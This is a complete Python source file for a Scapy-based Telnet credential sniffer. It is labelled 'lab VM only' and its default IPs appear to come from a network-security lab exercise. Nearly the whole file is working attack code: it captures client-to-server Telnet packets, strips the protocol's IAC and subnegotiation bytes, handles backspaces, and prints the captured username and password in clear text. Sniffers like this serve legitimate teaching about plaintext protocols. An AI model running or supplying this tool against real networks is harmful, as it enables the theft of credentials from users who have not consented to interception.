import argparse
import sys

from scapy.all import IP, TCP, Raw, sniff


def is_backspace(b: int) -> bool:
    return b in (0x08, 0x7f)

def printable(ch: int) -> bool:
    # basic printable ASCII range excluding CR/LF
    return 32 <= ch <= 126

def main():
    parser = argparse.ArgumentParser(description="Telnet credential sniffer (lab VM only)")
    parser.add_argument("-i", "--iface", help="listening interface (e.g., br-xxxx)", default=None)
    parser.add_argument("-c", "--client", help="client (Host A) IPv4", default="10.9.0.5")
    parser.add_argument("-s", "--server", help="server (Host B) IPv4", default="10.9.0.6")
    parser.add_argument("--both", action="store_true", help="also monitor server->client (echo); default off")
    parser.add_argument("-d", "--debug", action="store_true", help="enable debug output")
    args = parser.parse_args()

    client_ip = args.client
    server_ip = args.server

    # BPF filter for telnet TCP port 23 - always client->server only to avoid duplicates
    bpf = f"tcp port 23 and (src host {client_ip} and dst host {server_ip})"
    
    if args.debug and args.both:
        print("[DEBUG] --both flag ignored - always filtering client->server only to avoid duplicates")

    print("[*] Telnet sniffer started.")
    print(f"    iface={args.iface or '<default>'}  filter='{bpf}'")
    print("    Will stop automatically after capturing username and password.\n")
    print("Username: ", end="", flush=True)

    buf_lines = ["", ""]  # [username_line, password_line]
    cur_idx = 0           # 0=reading username, 1=reading password
    done = False
    in_iac_sequence = False
    iac_bytes_to_skip = 0
    in_sb = False
    in_sb_wait_se = False
    iac_command = None
    seen_packets = set()  # Track processed TCP sequence numbers

    def handle(pkt):
        nonlocal cur_idx, done, in_iac_sequence, iac_bytes_to_skip, seen_packets, in_sb, in_sb_wait_se, iac_command

        if Raw not in pkt or TCP not in pkt or IP not in pkt:
            return

        # Create unique packet identifier using TCP sequence number and data
        tcp_seq = pkt[TCP].seq
        data: bytes = bytes(pkt[Raw].load)
        packet_id = (tcp_seq, len(data), data[:8])  # seq + length + first 8 bytes
        
        # Skip if we've already processed this packet
        if packet_id in seen_packets:
            if args.debug:
                print(f"[DEBUG] Duplicate packet detected, skipping (seq={tcp_seq})")
            return
        
        seen_packets.add(packet_id)
        
        if args.debug:
            print(f"\n[DEBUG] Packet captured: {len(data)} bytes from {pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport} (seq={tcp_seq})")
            print(f"[DEBUG] Raw bytes: {' '.join(f'{b:02x}' for b in data)}")

        # Telnet can put multiple chars in one TCP segment; process byte-by-byte
        for b in data:
            if done:
                return

            if args.debug:
                printable_char = chr(b) if printable(b) else '?'
                print(f"[DEBUG] Processing byte: {b:3d} (0x{b:02x}) '{printable_char}' | cur_idx={cur_idx} | in_iac={in_iac_sequence} | skip={iac_bytes_to_skip}")

            # Handle IAC (Interpret As Command) sequences and subnegotiation
            if in_sb:
                if in_sb_wait_se:
                    if b == 240:  # SE
                        in_sb = False
                        in_sb_wait_se = False
                    elif b == 255:
                        in_sb_wait_se = False
                    else:
                        in_sb_wait_se = False
                    if args.debug:
                        print(f"[DEBUG] Skipping SB byte")
                    continue
                elif b == 255:
                    in_sb_wait_se = True
                    if args.debug:
                        print(f"[DEBUG] SB IAC detected")
                    continue
                else:
                    if args.debug:
                        print(f"[DEBUG] Skipping SB data byte")
                    continue

            if in_iac_sequence:
                if iac_command is None:
                    iac_command = b
                    if iac_command == 250:  # SB
                        in_sb = True
                        in_iac_sequence = False
                    else:
                        iac_bytes_to_skip = 1
                    if args.debug:
                        print(f"[DEBUG] IAC command {iac_command}")
                    continue
                else:
                    iac_bytes_to_skip -= 1
                    if iac_bytes_to_skip == 0:
                        in_iac_sequence = False
                        iac_command = None
                    if args.debug:
                        print(f"[DEBUG] Skipping IAC parameter byte")
                    continue

            # Check for IAC byte (0xFF / 255)
            if b == 255:
                in_iac_sequence = True
                iac_command = None
                iac_bytes_to_skip = 1
                if args.debug:
                    print(f"[DEBUG] IAC detected")
                continue

            # Skip other telnet control bytes in the 240-254 range
            if 240 <= b <= 254:
                if args.debug:
                    print(f"[DEBUG] Skipping telnet control byte")
                continue

            if is_backspace(b):
                if buf_lines[cur_idx]:
                    buf_lines[cur_idx] = buf_lines[cur_idx][:-1]
                    sys.stdout.write("\b \b")  # visual backspace
                    sys.stdout.flush()
                    if args.debug:
                        print(f"[DEBUG] Backspace processed, buffer now: '{buf_lines[cur_idx]}'")
                continue

            if b in (0x0d, 0x0a):  # CR or LF -> end of this line
                if args.debug:
                    print(f"[DEBUG] CR/LF detected, buffer: '{buf_lines[cur_idx]}'")
                
                # Only process if we have captured something
                if not buf_lines[cur_idx]:
                    if args.debug:
                        print(f"[DEBUG] Empty buffer, ignoring CR/LF")
                    continue
                
                sys.stdout.write("\n")
                sys.stdout.flush()

                if cur_idx == 0:
                    # finished username, switch to password
                    if args.debug:
                        print(f"[DEBUG] Username complete: '{buf_lines[0]}', switching to password")
                    print()  # newline after username
                    print("Password: ", end="", flush=True)
                    cur_idx = 1
                else:
                    # finished password, stop
                    if args.debug:
                        print(f"[DEBUG] Password complete: '{buf_lines[1]}', stopping")
                    print("\n[+] Capture complete.")
                    print(f"username: {buf_lines[0]}")
                    print(f"password: {buf_lines[1]}")
                    done = True
                continue

            # Accept only printable single-byte ASCII for display
            if printable(b):
                ch = chr(b)
                buf_lines[cur_idx] += ch
                
                # Show visual feedback
                if cur_idx == 0:  # username - show actual characters
                    sys.stdout.write(ch)
                    sys.stdout.flush()
                else:  # password - show asterisks
                    sys.stdout.write("*")
                    sys.stdout.flush()
                    
                if args.debug:
                    print(f"[DEBUG] Added '{ch}' to buffer[{cur_idx}]: '{buf_lines[cur_idx]}'")
            elif args.debug:
                print(f"[DEBUG] Non-printable byte ignored")

    sniff_kwargs = dict(filter=bpf, prn=handle, store=False)
    if args.iface:
        sniff_kwargs["iface"] = args.iface

    try:
        sniff(**sniff_kwargs)
    except KeyboardInterrupt:
        pass

    if not done:
        print("\n[!] Did not complete both username and password lines. Try again or check filter/interface.")

if __name__ == "__main__":
    main()